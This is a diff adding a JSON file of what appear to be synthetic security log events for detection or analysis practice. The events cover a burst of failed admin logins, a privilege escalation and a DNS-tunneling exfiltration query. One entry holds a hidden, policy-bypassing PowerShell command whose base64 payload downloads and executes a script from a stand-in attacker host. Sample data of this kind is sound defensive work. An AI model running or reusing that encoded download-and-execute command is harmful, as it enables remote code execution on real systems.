@@ -1,0 +1,83 @@
+[
+  {
+    "timestamp": "2026-02-25T09:00:01Z",
+    "event_id": 4624,
+    "ip": "192.168.1.15",
+    "user": "sysadmin",
+    "action": "LOGIN_SUCCESS",
+    "severity": "Low"
+  },
+  {
+    "timestamp": "2026-02-25T09:05:10Z",
+    "event_id": 4625,
+    "ip": "203.0.113.42",
+    "user": "admin",
+    "action": "LOGIN_FAILED",
+    "severity": "Medium"
+  },
+  {
+    "timestamp": "2026-02-25T09:05:12Z",
+    "event_id": 4625,
+    "ip": "203.0.113.42",
+    "user": "admin",
+    "action": "LOGIN_FAILED",
+    "severity": "Medium"
+  },
+  {
+    "timestamp": "2026-02-25T09:05:14Z",
+    "event_id": 4625,
+    "ip": "203.0.113.42",
+    "user": "admin",
+    "action": "LOGIN_FAILED",
+    "severity": "Medium"
+  },
+  {
+    "timestamp": "2026-02-25T09:05:16Z",
+    "event_id": 4625,
+    "ip": "203.0.113.42",
+    "user": "admin",
+    "action": "LOGIN_FAILED",
+    "severity": "Medium"
+  },
+  {
+    "timestamp": "2026-02-25T09:05:18Z",
+    "event_id": 4625,
+    "ip": "203.0.113.42",
+    "user": "admin",
+    "action": "LOGIN_FAILED",
+    "severity": "Medium"
+  },
+  {
+    "timestamp": "2026-02-25T09:05:20Z",
+    "event_id": 4625,
+    "ip": "203.0.113.42",
+    "user": "admin",
+    "action": "LOGIN_FAILED",
+    "severity": "Critical"
+  },
+  {
+    "timestamp": "2026-02-25T09:10:00Z",
+    "event_id": 1,
+    "ip": "192.168.1.15",
+    "user": "sysadmin",
+    "action": "PROCESS_START",
+    "message": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA",
+    "severity": "High"
+  },
+  {
+    "timestamp": "2026-02-25T09:15:00Z",
+    "event_id": 4672,
+    "ip": "127.0.0.1",
+    "user": "guest",
+    "action": "PRIVILEGE_ESCALATION",
+    "message": "Special privileges assigned to new logon",
+    "severity": "Critical"
+  },
+  {
+    "timestamp": "2026-02-25T09:20:00Z",
+    "ip": "10.0.0.5",
+    "action": "DNS_QUERY",
+    "message": "Query: v3ry-l0ng-subd0ma1n-f0r-exf1ltrat10n.tunneling-service.net",
+    "severity": "Medium"
+  }
+]
